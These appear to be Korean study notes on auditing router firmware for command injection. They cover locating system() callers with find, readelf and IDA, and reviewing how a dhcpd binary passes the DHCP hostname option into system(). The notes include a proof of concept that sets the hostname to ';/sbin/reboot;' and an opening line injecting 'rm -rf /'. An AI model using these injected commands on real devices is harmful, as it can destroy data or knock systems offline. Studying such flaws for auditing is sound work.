system("echo ;rm -rf /; >> /tmp/abc.txt")

1. 커맨드 인젝션 취약점에 잠재적으로 노출된 실행 파일을 식별
2. system(), exec() 류의 함수에 전달되는 명령어 문자열이 동적으로 생성되는지 확인
3. 명령어 문자열이 동적으로 생성되는 경우, 명령어 문자열에 외부(다른 프로세스, 사용자 등)에서 입력받은 데이터가 포함되어있는지 확인
4. 별도로 인증받지 않은 사용자가 해당 프로그램에 접근할 수 있는지 확인
5. 적절한 filtering, sanitizing이 수행되는지 확인

1~5가 모두참이면 취약(심각)
1~3, 5가 모두 참이면 취약 (조금 심각)
1~3이 참이면 권고

system("echo hello world") <= 심각하지않음

find . -executable -exec egrep system {} \; 2</dev/null //system이 있는 실행가능한 파일

readelf -s sbin/dhcpd // readelf->리버싱툴

file sbin/dhcpd
sbin/dhcpd: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
LSB -> little endian

RISC VS CISC
RISC : Load/Store 구조 -> 하드웨어 구성 쉬움, 레지스터 多
CISC : 하드웨어구성 어려움
(RISC)
load R0, 0x1
load R1, 0x2
add RO, R1
store R0, 1
=
(CISC)
add R0, R1




COMMAND INJECTIN 취약점 점검/리뷰

1. 커맨드 인젝션 취약점에 잠재적으로 노출된 실행 파일 식별
$ find 펌웨어루트디렉토리 -executable -exec grep system {} \; //{}은 찾은파일 명이 들어오는 부분
$ readelf -s 펌웨어루트디렉토리/sbin/dhcpd | grep system

2. 코드리뷰
system() 함수에 전달되는 파라미터(명령어 문자열)이 동적으로 생성되는지 확인
동적으로 생성되는 명령어 문자열에 사용자/외부 입력값이 포함되는지, 적절하게 필터링등을 수행하는지

- IDA로 dhcpd을 open, 아키텍쳐는 file 명령어로 확인 (MIPS little endian)
- function window에서 system 함수 검색한 후, 더블클릭해 GOT로 이동
- CODE XREF(cross reference)를 확인하여 system()함수 호출 지점을 확인하고 더블클릭하여 호출 지점으로 이동
- 코드리뷰 결과 취약함

$s0 = get_option($packet, DHCP_HOSTNAME)
memcpy($s1, $s0)
sprintf($s0,"echo %s %d > /var/hostname", $s1,지역변수_1)
system($s0)

3. PoC
$ sudo vi etc/dhcp/dhclient.conf
send host-name ";/sbin/reboot;";
$ sudo kill -9 $(pidof dhclient);
$ sudo dhclient 인터페이스명 => 실행 후 UART를 통해 공유기가 재부팅되는지 확인
